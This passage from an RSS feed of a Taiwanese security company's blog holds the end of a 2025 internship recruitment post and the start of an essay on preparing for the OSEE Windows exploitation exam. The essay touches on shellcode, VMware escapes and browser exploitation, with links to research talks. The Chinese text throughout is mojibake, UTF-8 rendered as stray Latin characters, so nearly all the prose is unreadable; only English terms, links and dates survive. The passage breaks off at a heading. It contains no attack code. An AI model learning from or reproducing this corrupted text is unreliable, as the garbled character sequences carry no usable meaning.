          &lt;li&gt;è«‹æå‡ºå…©å€‹æ–¼è¥¿å…ƒ 2022 ~ 2025 å¹´é–“å…¬é–‹çš„ã€èˆ‡ Web æ”»æ“Šé¢ã€ç´…éšŠæ‰‹æ³•ã€æ¼æ´æˆ–æ”»æ“Šéˆç›¸é—œçš„æŠ€è¡“æ¼”è¬›ï¼Œè«‹èªªæ˜ç‚ºä»€éº¼æŒ‘é¸é€™äº›æ¼”è¬›ä¸¦è§£é‡‹å®ƒå€‘ç‚ºä»€éº¼æœ‰è¶£ã€‚
            &lt;ul&gt;
              &lt;li&gt;è«‹ç”¨ä½ çš„ç†è§£é‡æ–°ä»¥æ–‡å­—è©³ç´°è§£é‡‹é€™äº›æ¼”è¬›çš„æŠ€è¡“ç´°ç¯€ï¼Œæ•´ç†æˆä¸€ä»½ Write-up ä»¥ PDF æ ¼å¼è¼¸å‡ºï¼Œä¸¦æä¾›ä»»ä½•ä½ è¦ºå¾—å¯ä»¥è¼”åŠ©æˆ–è­‰æ˜ä½ ç†è§£çš„é™„åŠ è³‡æ–™ã€‚&lt;/li&gt;
              &lt;li&gt;é€™äº›æ¼”è¬›å¯ä»¥ä¾†è‡ªåŒ…å«ä½†ä¸é™æ–¼ Black Hatã€DEF CONã€OffensiveConã€POCã€Zer0Conã€Hexaconã€HITCONã€TROOPERS CONFERENCE ç­‰æœƒè­°ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µé¢è©¦&quot;&gt;ç¬¬äºŒéšæ®µï¼šé¢è©¦&lt;/h4&gt;

&lt;p&gt;æ­¤éšæ®µç‚º 30~120 åˆ†é˜ï¼ˆä¾ç…§çµ„åˆ¥éœ€æ±‚è€Œå®šï¼Œæœƒå¦è¡Œé€šçŸ¥ï¼‰çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2025/07/07 - 2025/07/28 å…¬é–‹æ‹›å‹Ÿï¼Œæ¥æ”¶å±¥æ­·èˆ‡ç¬¬ä¸€éšæ®µå¯©æ ¸&lt;/li&gt;
  &lt;li&gt;2025/07/28 - 2025/08/04 é€šçŸ¥ç¬¬ä¸€éšæ®µå¯©æ ¸çµæœã€å®‰æ’é¢è©¦&lt;/li&gt;
  &lt;li&gt;2025/08/04 - 2025/08/14 ç¬¬äºŒéšæ®µé¢è©¦ï¼ˆè‹¥å ±åè¸´èºæœƒæå‰é–‹å§‹é¢è©¦ï¼‰&lt;/li&gt;
  &lt;li&gt;2025/08/18 å‰å›æ‡‰çµæœ&lt;/li&gt;
  &lt;li&gt;2025/09/01 ç¬¬å…«å±†å¯¦ç¿’è¨ˆç•«æ–¼ç•¶é€±é–‹å§‹&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;p&gt;è«‹æ–¼ &lt;strong&gt;2025/07/28 23:59&lt;/strong&gt; å‰å®Œæˆå¡«å¯« &lt;a href=&quot;https://forms.gle/aXKqVcbxGndAYMew8&quot;&gt;Google è¡¨å–®&lt;/a&gt; ä¸¦ä¸Šå‚³ç›¸é—œé™„ä»¶ã€‚ä»¥ä¸‹ç‚ºå¡«å¯«è¡¨å–®çš„æ³¨æ„äº‹é …ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æª”æ¡ˆç¶“ä¸Šå‚³å¾Œç„¡æ³•åˆªé™¤æˆ–ä¿®æ”¹ï¼Œæ¬²æ›´æ–°æª”æ¡ˆè«‹é‡æ–°å¡«å¯«ä¸€ä»½è¡¨å–®&lt;/li&gt;
  &lt;li&gt;æ‚¨å¯ä»¥éš¨æ™‚ç·¨è¼¯å·²æäº¤çš„è¡¨å–®ï¼Œæˆ–æ˜¯é‡æ–°å¡«å¯«ä¸€ä»½æ–°çš„è¡¨å–®ä¾†æ›´æ–°å ±åè³‡è¨Šã€‚è«‹æ³¨æ„ï¼Œæˆ‘å€‘æœƒä»¥&lt;strong&gt;æœ€å¾Œä¸€æ¬¡&lt;/strong&gt;æäº¤çš„è¡¨å–®å…§å®¹ä½œç‚ºå¯©æ ¸ä¾æ“š&lt;/li&gt;
  &lt;li&gt;è«‹å‹™å¿…æ–¼&lt;strong&gt;æˆªæ­¢æ™‚é–“ï¼ˆ2025/07/28 23:59ï¼‰&lt;/strong&gt; å‰å®Œæˆæ‰€æœ‰è¡¨å–®å¡«å¯«èˆ‡æª”æ¡ˆä¸Šå‚³ï¼Œé€¾æœŸæœªå®Œæˆè€…å°‡è¦–åŒæ”¾æ£„æ‡‰å¾µè³‡æ ¼&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å ±åæˆªæ­¢å¾Œï¼Œæˆ‘å€‘æœƒæ ¹æ“šæ‚¨æäº¤çš„å ±åå…§å®¹é€²è¡Œç¬¬ä¸€éšæ®µå¯©æ ¸ã€‚å¯©æ ¸çµæœå°‡æ–¼ &lt;strong&gt;2025/08/01&lt;/strong&gt; å‰é€šçŸ¥ï¼Œä¸¦å®‰æ’é€²ä¸€æ­¥çš„é¢è©¦ã€‚æœ€çµ‚éŒ„å–åå–®å°‡æ–¼ &lt;strong&gt;2025/08/18&lt;/strong&gt; å…¬ä½ˆï¼Œæˆ‘å€‘ä¹ŸæœƒåŒæ­¥é€šçŸ¥éŒ„å–æƒ…æ³ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹å¯„ä¿¡åˆ° recruiting_intern@devco.reï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/07/07/8th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2025/07/07/8th-internship-program-recruit</guid>
                <pubDate>Mon, 07 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¾ Web ç‹—çš„è¦–è§’çœ‹ OSEE â€” å¾ 0.1 é–‹å§‹çš„ Advanced Windows Exploitation è€ƒè©¦</title>
                <description>&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;âœ…ï¼šã€èª²ç¨‹çµæŸå¾Œä¸€å¹´å…§è¦è€ƒåˆ° OSEE è­‰ç…§å–”ã€&lt;/p&gt;

&lt;p&gt;ğŸŠï¼šã€Œå®‰å•¦ï¼Œæœ‰ä¸€æ•´å¹´èƒ½æº–å‚™å“ªä¸è¡Œã€&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ï¼ˆâ³â‹¯â‹¯ï¼‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;âœ…ï¼šã€å…¬å¸ä¸‹å€‹æœˆé–‹å§‹&lt;a href=&quot;https://training.devco.re/2025&quot;&gt;å®£å‚³èª²ç¨‹&lt;/a&gt;ï¼Œåˆ°æ™‚å€™è¦æœ‰å¿ƒå¾—æ–‡å”·ã€&lt;/p&gt;

&lt;p&gt;ğŸŠï¼šã€Œå¥½ï¼ˆé»˜é»˜æ‰“é–‹ OffSec ç¶²ç«™æ’äº†æ­»ç·šå‰ä¸€å¤©è€ƒè©¦ï¼‰ã€&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ï¼ˆâ³â‹¯â‹¯ï¼‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ğŸŠï¼šã€Œä¸‹ç¦®æ‹œå°±è¦è€ƒè©¦äº†ï¼Œæ€éº¼æœƒé€™æ¨£ ãƒ½(ï¾ŸĞ”ï¾Ÿâ‰¡ï¾ŸĞ”ï¾Ÿ)ï¾‰ ã€&lt;/p&gt;

&lt;p&gt;âœ…ï¼šã€ä½ åˆ°åº•åœ¨å¹¹å˜›ï¼Ÿï¼Ÿï¼Ÿã€&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç®—æ˜¯è‡ªå·±æº–å‚™ OSEE è€ƒè©¦çš„ä¸€é»å°å¿ƒå¾—ï¼Œé—œæ–¼èª²ç¨‹å…§å®¹å¤§å®¶å¯ä»¥åƒè€ƒä¸Šä¸€ç¯‡ç”± NiNi æ’°å¯«çš„ã€Š&lt;a href=&quot;https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»&lt;/a&gt;ã€‹ï¼Œä¹Ÿå¯ä»¥æœŸå¾…ä¸‹ç¦®æ‹œ Angelboy è¦å‡ºçš„ã€Œæˆ‘ç¨è‡ªé€Ÿé€š OSEE ğŸˆâ€â¬›ã€ï¼&lt;/p&gt;

&lt;p&gt;ä¸éèªªå¯¦è©±ï¼Œæº–å‚™é€™å€‹è€ƒè©¦çœŸçš„å£“åŠ›å¾ˆå¤§ï¼›ç›¸è¼ƒå‰å¹¾å€‹äººï¼Œä»–å€‘æ ¹æœ¬å°±æ˜¯ç”¨æ¯èªè€ƒ N1 è¶…ç´šä¸å…¬å¹³ï¼ä½†å¦‚æœæ•´å€‹ç ”ç©¶çµ„åˆåªæœ‰æˆ‘æ²’éï¼Œä¸€å®šæœƒè¢«ä»–å€‘ç¬‘åŠå¤©ï¼ˆå¯èƒ½ä¸åª ğŸ¤·â€â™‚ï¸ï¼‰ï¼›ç‚ºäº†ä¸ä¸Ÿå…¬å¸é¦–å¸­ï¼ˆé‚„æœ‰è‡ªå·±ï¼‰çš„è‡‰ï¼Œåªå¥½å°å°è·³è„«èˆ’é©åœˆã€èªçœŸæº–å‚™ OSEE è€ƒè©¦ã€‚å› æ­¤é€™ç¯‡æ–‡ç« å°‡å¾å€‹äººçš„è§’åº¦å‡ºç™¼ã€è©•ä¼°è‡ªå·±æ‰€æ“æœ‰çš„æŠ€èƒ½ã€è¡¡é‡æ˜¯å¦ç¬¦åˆ OSEE è€ƒè©¦æ‰€éœ€çš„æœ€ä½è¦æ±‚ï¼Œä¸¦åŠ ä»¥æº–å‚™ã€‚å¦‚æœä½ çœ‹å®Œå¾Œè¦ºå¾—ã€Œå°±é€™æ¨£ï¼Ÿã€ï¼Œé‚£ç›¸ä¿¡ä½ ä¸€å®šä¹Ÿèƒ½è¼•é¬†é€šéè™Ÿç¨± OffSec ç³»åˆ—æœ€é›£çš„ EXP-401 è€ƒè©¦ï¼  (à¹‘â€¢Ì€ã…‚â€¢Ì)Ùˆâœ§&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;å‰æƒ…æè¦&quot;&gt;å‰æƒ…æè¦&lt;/h1&gt;

&lt;p&gt;åŸºæœ¬ä¸Šï¼Œèª²ç¨‹å…§å®¹æ—©å°±å¿˜å…‰å…‰ã€‚è€Œé€™åŠå¹´ç‚ºäº†ä¸€äº›é…·æ±è¥¿ï¼ˆæ•¬è«‹æœŸå¾…âœ¨ï¼‰ï¼Œä¹Ÿå¥½å¹¾å€‹æœˆæ²’é–‹é IDA Pro äº†ï¼Œæˆ‘ç›´åˆ°è€ƒå‰ä¸€å€‹ç¦®æ‹œæ‰æ„è­˜åˆ°å¤§äº‹ä¸å¦™ ğŸ˜¨ï¼›æ›´ä½•æ³ç•¶åˆç‚ºäº†å£“æ­»ç·šï¼Œé‚„æŠŠè€ƒè©¦æ’åœ¨ä¸€å€‹è¶…çˆ›çš„æ™‚é–“é»ï¼ˆå‘¨æ—¥æ—©ä¸Šäº”é»ï¼‰ã€‚æ‰£æ‰æ‰‹ä¸Šåœ¨å¼„çš„é…·æ±è¥¿ã€å…¬å¸åº¶å‹™ï¼ˆå¥½æ­¹æˆ‘ä¹Ÿæ˜¯å€‹ä¸»ç®¡ â•®(â•¯_â•°)â•­ï¼‰ï¼Œé›¶é›¶ç¸½ç¸½åŠ èµ·ä¾†åªæœ‰ã€Œä¸‰å¤©ã€èƒ½è®€æ›¸ï¼&lt;/p&gt;

&lt;p&gt;ï¼ˆä»€éº¼ï¼Œå‘¨ä¼‘ä¸‰æ—¥ï¼Ÿç ”ç©¶å“¡æ˜¯æ²’æœ‰ä¼‘å‡çš„ï¼ï¼‰&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250702/upload_f9464b7a270903509c9c72dfad45de1d.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾å‰ä¸€ç¯‡ NiNi çš„æ–‡ä¸­ç›¸ä¿¡å¤§å®¶å·²ç¶“çŸ¥é“ï¼Œæ•´ä»½ OSEE æ•™æç´„æœ‰ 600 é ã€‚é‘’æ–¼ä¸Šæ¬¡è®€åŸæ–‡æ›¸å·²ç¶“æ˜¯é«˜ä¸­ï¼ˆ&lt;a href=&quot;https://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921&quot;&gt;Gray Hat Python&lt;/a&gt; â€”â€” å˜¿å°ï¼Œæˆ‘å¤§å­¸æ²’è®€éåŸæ–‡æ›¸XDï¼‰ï¼Œæˆ‘æ±ºå®šç¬¬ä¸€å¤©å…ˆæŠŠç²¾åŠ›èŠ±åœ¨æƒ…è’ï¼šæ‰¾æ‰¾æœ‰æ²’æœ‰è€ƒå¤é¡Œï¼Œæˆ–èƒ½å¾åˆ¥äººçš„å¿ƒå¾—èƒå–ä¸€äº›è³‡è¨Šï¼›ç›¡å¯èƒ½å¤§è†½åœ°çŒœé¡Œï¼Œä¸¦æƒ³åƒè€ƒè©¦æ™‚å¯èƒ½æœƒé‡åˆ°çš„åã€‚éç¨‹ä¸­ç™¼ç¾ OSEE çš„é¡Œç›®å¾ˆå›ºå®šï¼Œåªæœ‰å…©é¡Œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Windows Kernel çš„æœ¬åœ°ææ¬Š&lt;/li&gt;
  &lt;li&gt;UserMode App çš„é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œç¶²è·¯ä¸Šçš„æ™®éè©•åƒ¹éƒ½æ˜¯ï¼šå‰è€…ç°¡å–®åˆ°çˆ†ï¼Œå¾Œè€…æ‰æ˜¯æ•´å€‹è€ƒè©¦çš„é‡é»ï¼Œè·³è„« Sandbox çš„éƒ¨åˆ†ä¹Ÿåœ¨é€™ï¼åœ¨å°è€ƒè©¦å…§å®¹å¤§è‡´æœ‰å€‹è¼ªå»“å¾Œï¼Œä¾¿é–‹å§‹èªå‘½è®€æ›¸ â€”â€” å¤§æ¦‚æ˜¯ä¸€å¤©è¦è®€å€‹ 200 é æ‰èƒ½è¶•å¾—ä¸Šçš„é€²åº¦ä¹‹é¡çš„ã€‚æ•´å€‹ OSEE èª²ç¨‹ä¸»è¦åˆ†æˆäº”å€‹éƒ¨åˆ†ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Shellcode&lt;/strong&gt; - Windows Shellcode&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VM-Escape Exploit&lt;/strong&gt; - VMware Workstation Guest-To-Host Escape&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Browser Exploit&lt;/strong&gt; - Microsoft Edge Type Confusion&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel Exploit Part 1&lt;/strong&gt; - Driver Callback Overwrite&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel Exploit Part 2&lt;/strong&gt; - Unsanitized User-mode Callback&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸Šé¢çš„å…§å®¹ä¸¦éå®Œå…¨æ²’æœ‰ç¶“é©—ï¼Œä½†ä¹Ÿä¸èƒ½èªªæœ‰ç¶“é©—ã€‚ä½ å¯èƒ½æƒ³èªªã€Œé€™å€‹äººåœ¨ä¾›ä¸‰å°ã€ï¼Ÿä¸”è½æˆ‘å¨“å¨“é“ä¾†ï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;æº–å‚™éç¨‹&quot;&gt;æº–å‚™éç¨‹&lt;/h1&gt;

&lt;h2 id=&quot;1--windows-shellcode&quot;&gt;1.  Windows Shellcode&lt;/h2&gt;

&lt;p&gt;ç¬¬ä¸€å€‹ç« ç¯€ä¸»è¦æ¶µè“‹ Windows åŸºç¤çŸ¥è­˜ä»¥åŠ Shell Coding ä¸Šçš„å„ç¨®æ…£ä¾‹ã€‚Windows çš„ Shellcode ä¸åƒ Unix-Like ç³»çµ±ä¸Šé‚£éº¼æ–¹ä¾¿ï¼ŒçŸ­çŸ­&lt;a href=&quot;https://shell-storm.org/shellcode/files/shellcode-909.html&quot;&gt;åå¹¾å€‹ Bytes å°±èƒ½è·³å€‹ Shell&lt;/a&gt;ï¼›å¿…é ˆä½¿ç”¨çµ„åˆèªè¨€åœ¨å„ç¨®ä¸åŒçš„ Windows çµæ§‹ä¸­è·³è½‰ï¼Œä¸¦å‹•æ…‹å–å‡ºç›¸å°æ‡‰çš„ Symbol åœ°å€ã€‚å› æ­¤ä¸€çµ„ Shellcode å‹•è¼’å…©ã€ä¸‰ç™¾ Bytes èµ·è·³ï¼Œç”šè‡³åˆ©ç”¨ &lt;a href=&quot;https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf&quot;&gt;Egg Hunting&lt;/a&gt; ä¹Ÿæ˜¯å®¶å¸¸ä¾¿é£¯ã€‚&lt;/p&gt;

&lt;p&gt;å°æˆ‘ä¾†èªªï¼Œå¯ä»¥å¿«é€Ÿè·³éé€™å€‹ç« ç¯€çš„åŸå› ä¸»è¦æ­¸åŠŸæ–¼æ—©æœŸåœ¨ç©&lt;a href=&quot;https://blog.orange.tw/posts/2012-07-hacks-in-taiwan-2012-potent-pwnables-3/&quot;&gt;çš®å¡ä¸˜æ‰“æ’çƒ&lt;/a&gt;æ™‚çš„è¨“ç·´ã€‚åœ¨ç•¶æ™‚ï¼ˆé‚„æ˜¯ Perl æ™‚ä»£ï¼‰çš„ Metasploit é‚„ä¸åƒç¾åœ¨é‚£éº¼ç©©å®šï¼Œå› æ­¤è‡ªå·±å¯«ä¸€å¥— Shellcode æ¡†æ¶å°±è®Šæˆä¸€ä»¶å¾ˆç‚«çš„äº‹ã€‚è€Œå¾ˆå¤š&lt;a href=&quot;https://www.exploit-db.com/exploits/13529&quot;&gt;å¤æ—©çš„ç”¢ç”Ÿå™¨&lt;/a&gt;éƒ½æœƒå¯«æ­»ä¸€äº›å€¼ï¼Œå°è‡´å…¶ç„¡æ³•æ©«è·¨å¤šå€‹ Windows ç‰ˆæœ¬ï¼›å› æ­¤ç‚ºäº†è®“ä¸€ä»½ Shellcode å¯ä»¥è·¨å¹³å°ï¼Œå¿…é ˆç¢ºå¯¦äº†è§£æ¯è¡ŒæŒ‡ä»¤ï¼Œä¸¦å˜—è©¦ä¿®å¾©å®ƒå€‘ï¼&lt;/p&gt;

&lt;p&gt;å› æ­¤ç°¡å–®ä¾†èªªï¼Œé€™å°±æ˜¯å€‹ç”¨ä¾†æš–èº«çš„ç’°ç¯€ â€”â€” è€ƒé©—è‘—å­¸ç”Ÿå°çµ„åˆèªè¨€çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œä»¥åŠæ˜¯å¦å…·å‚™å°æœ¬å ‚èª²ç¨‹æœ€æœ€æœ€æœ€æœ€åŸºæœ¬çš„çŸ¥è­˜ï¼Œé€™æ‡‰è©²ä¹Ÿæ˜¯å€‹é †ä¾¿çµ¦è€å¸«è©•ä¼°å­¸ç”Ÿç¨‹åº¦ï¼ˆï¼Ÿï¼‰çš„ç’°ç¯€ã€‚å¦‚æœä¸Šé¢çš„å…§å®¹è½èµ·ä¾†æœ‰é»é™Œç”Ÿï¼Œé‚£ä½ å¯ä»¥è€ƒæ…®å…ˆè·³éé€™å¼µè­‰ç…§ï¼Œæˆ–èªçœŸè®€è®€ã€Š&lt;a href=&quot;https://www.tenlong.com.tw/products/9787121336928&quot;&gt;åŠ å¯†èˆ‡è§£å¯†&lt;/a&gt;ã€‹ï¼ï¼ˆå°åŒ—å¤©ç“é‚„æœ‰è³£ï¼Œæ²’æƒ³åˆ°å‡ºåˆ°ç¬¬å››ç‰ˆäº†XDï¼‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-vm-escape-exploit&quot;&gt;2. VM-Escape Exploit&lt;/h2&gt;

&lt;p&gt;å¾é€™å€‹ç« ç¯€èµ·ï¼Œæ•´å€‹ OSEE æ‰ç®—çœŸæ­£é–‹å§‹è¦‹çœŸç« ï¼æ­£å¦‚å…¶åï¼Œé€™ä¸€ç« å°ˆæ³¨åœ¨ã€Œå¦‚ä½•å¾è™›æ“¬æ©Ÿè·³å‡ºä¾†ã€ã€‚å°æˆ‘ä¾†èªªï¼Œé€™ä¹Ÿç®—å¦ä¸€å€‹èƒ½ç”¨ç¶“é©—è¼¾å£“çš„ç« ç¯€ï¼Œæˆ‘ç´„åœ¨æ•¸å¹´å‰æœ‰å°ç ”ç©¶é VMware çš„æ”»æ“Šé¢ï¼Œå› æ­¤ç„¡è«–æ˜¯ VMware çš„ Backdoor æ©Ÿåˆ¶æˆ–æ˜¯åŸºæ–¼å…¶ä¹‹ä¸Šçš„ Drag &amp;amp; Drop æ¼æ´éƒ½èƒ½é§•è¼•å°±ç†Ÿï¼Œå°è±¡é‚£æ™‚é‚„å¾ˆèªçœŸé€†å‘äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmware-vmx&lt;/code&gt;ï¼Œä¸¦æ‰¾å‡ºä¸€äº›æ¼æ´ï¼ˆè¢«å» å•†æ‘¸é ­åˆæ˜¯å¦å€‹æ•…äº‹äº† Â¯\_(ãƒ„)_/Â¯ ï¼‰ã€‚å› æ­¤å¦‚æœæœ‰èªçœŸè®€éä¸‹é¢é€™å¹¾ç¯‡ï¼Œé‚£æˆ‘æƒ³é€™å€‹ç« ç¯€æ‡‰è©²å°±å·®ä¸å¤šäº†ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017 - &lt;a href=&quot;https://github.com/acama/acez.re/blob/main/The%20Weak%20Bug%20-%20Exploiting%20a%20Heap%20Overflow%20in%20VMware.md&quot;&gt;The Weak Bug - Exploiting a Heap Overflow in VMware&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2017 - &lt;a href=&quot;https://www.blackhat.com/docs/eu-17/materials/eu-17-Mandal-The-Great-Escapes-Of-Vmware-A-Retrospective-Case-Study-Of-Vmware-G2H-Escape-Vulnerabilities.pdf&quot;&gt;The Great Escapes of VMware: A Retrospective Case Study of â€¦&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2018 - &lt;a href=&quot;https://keenlab.tencent.com/en/2018/04/23/A-bunch-of-Red-Pills-VMware-Escapes/&quot;&gt;A bunch of Red Pills: VMware Escapes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2018 - &lt;a href=&quot;https://www.offensivecon.org/speakers/2018/zdi-team.html&quot;&gt;Lâ€™art de lâ€™Ã©vasion: Modern VMWare Exploitation Techniques&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸éï¼Œé›–ç„¶æˆ‘å¿«é€Ÿè·³éäº†é€™ç« çš„å‰åŠï¼Œä½†ç”±æ–¼ç•¶åˆæ˜¯å¾ã€Œæ‰¾æ¼æ´ã€çš„è¦–è§’ä¸‹å»å­¸ç¿’ï¼Œä¸¦æ²’æœ‰èŠ±å¤ªå¤šæ™‚é–“è‘—å¢¨åœ¨ã€Œå¦‚ä½•åˆ©ç”¨æ¼æ´ã€ä¸Šï¼Œå› æ­¤æˆ‘åè€ŒèŠ±äº†æ»¿å¤šé¡å¤–çš„æ™‚é–“åœ¨è¤‡ç¿’å¾ŒåŠæ®µçš„æ¼æ´åˆ©ç”¨ï¼Œä¾‹å¦‚ LFH æ©Ÿåˆ¶ï¼Œæˆ–æ˜¯å¦‚ä½•ç¹éé¡å¤–çš„ WDEG åŠ EAF ä¿è­·ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-browser-exploit&quot;&gt;3. Browser Exploit&lt;/h2&gt;

&lt;p&gt;é€™æ‡‰è©²æ˜¯æ•´å€‹èª²ç¨‹è½èµ·ä¾†æœ€é«˜å¤§ä¸Šçš„éƒ¨åˆ†ï¼Œå¾é€™é–‹å§‹é›£åº¦ä¹Ÿé€æ¼¸æ¯æ¹¯ã€‚é›–ç„¶åäº”å¹´å‰æˆ‘ä¹Ÿç©éæ‰€è¬‚çš„ã€Œ&lt;a href=&quot;https://blog.orange.tw/posts/2013-07-0-day-0-day-easy-talk-happy-fuzzing/&quot;&gt;ç€è¦½å™¨æ¼æ´&lt;/a&gt;ã€ã€‚ä¸éåœ¨ç•¶æ™‚ä¸»æµé‚„æ˜¯ x86 æ¶æ§‹ï¼Œåªè¦ä¸€å€‹ vtable call è·³åˆ° 0x0C0C0C0C å°±èƒ½è¼•é¬† Heap Spray çš„å¹´ä»£ï¼ˆé‚„æœ‰&lt;a href=&quot;https://zh.wikipedia.org/zh-tw/%E4%B8%AD%E6%96%87%E4%BA%82%E7%A2%BC#%E2%80%9C%E7%83%AB%E7%83%AB%E7%83%AB%E2%80%9D%E4%B8%8E%E2%80%9C%E5%B1%AF%E5%B1%AF%E5%B1%AF%E2%80%9D&quot;&gt;ç‡™ç‡™ç‡™è·Ÿå±¯å±¯å±¯&lt;/a&gt;XDï¼‰ â€”â€” æ­¤æ™‚å½¼æ™‚çš„é›£åº¦çµ•å°ç„¡æ³•åŒæ—¥è€Œèªã€‚&lt;/p&gt;

&lt;p&gt;å›é¡§é€™å¹¾å¹´ï¼Œæˆ‘å°ç€è¦½å™¨æ¼æ´çš„èªè­˜ä¹Ÿé‚„åœç•™åœ¨åŸºç¤çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addressOf&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeObj&lt;/code&gt;ï¼Œæˆ–æ˜¯ç”¨ String Length å»é€ ä»»æ„è®€å¯«ã€‚é›–ç„¶é€™äº›æ‹›æ•¸åœ¨å¥½å¹¾å¹´å‰ä¹Ÿéæ™‚äº†ï¼Œä¸éå¥½åœ¨é€™äº›æ¦‚å¿µåœ¨åº•å±¤é‚„èƒ½é€šç”¨ã€‚æ­¤å¤–ï¼Œæ›´æ­¸åŠŸæ–¼ä»¥å‰ CTF çš„è¨“ç·´ï¼ˆè¢« &lt;a href=&quot;https://4ngelboy.blogspot.com/2016/03/advanced-heap-exploitation.html&quot;&gt;Advanced Heap Exploitation&lt;/a&gt; æ‘§æ®˜å¾Œé€™äº›éƒ½æ˜¯å°å…’ç§‘ ğŸ¤·â€â™‚ï¸ï¼‰ï¼Œå³ä½¿åœ¨ä¸ç†Ÿæ‚‰çš„å¹³å°ä¸Šï¼Œæ¼æ´è©²å¦‚ä½•åˆ©ç”¨ã€æˆ–æˆå› ç­‰ï¼Œé‚£äº›ç†Ÿæ‚‰åº¦éƒ½é‚„åœ¨ã€‚å› æ­¤åå€’æˆ‘æ›´å°ˆæ³¨åœ¨è¤‡ç¿’é€™ç« çš„ã€Œé˜²ç¦¦ç¹éã€ï¼ˆä¾‹å¦‚ CFGã€ACGï¼‰ã€ã€Œæ¼æ´çš„æ­¦å™¨åŒ–ã€ï¼ˆä½¿ç”¨ Data-Only Attack ç©¿æ¢­åœ¨ Assembly è·Ÿ JavaScript ä¸­ï¼‰ï¼Œä»¥åŠå¾ŒçºŒåœ°ç¹é Sandbox æœ¬èº«ã€‚&lt;/p&gt;

&lt;p&gt;â€”â€” å›é¡§æ™‚ï¼Œç™¼ç¾å°æ™‚å€™è‡ªå·±å±…ç„¶é‚„å®£ç¨±éã€Œå°ˆç²¾æ–¼ Windows æ¼æ´åˆ©ç”¨ã€ï¼Œæ‡‰è©²ä¹Ÿç®—ä¸€ç¨®&lt;a href=&quot;https://zh.wikipedia.org/zh-tw/%E9%84%A7%E5%AF%A7-%E5%85%8B%E9%AD%AF%E6%A0%BC%E6%95%88%E6%87%89&quot;&gt;æ„šæ˜§ä¹‹å·”&lt;/a&gt; ğŸ˜–ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-kernel-exploit---part-1&quot;&gt;4. Kernel Exploit - Part 1&lt;/h2&gt;

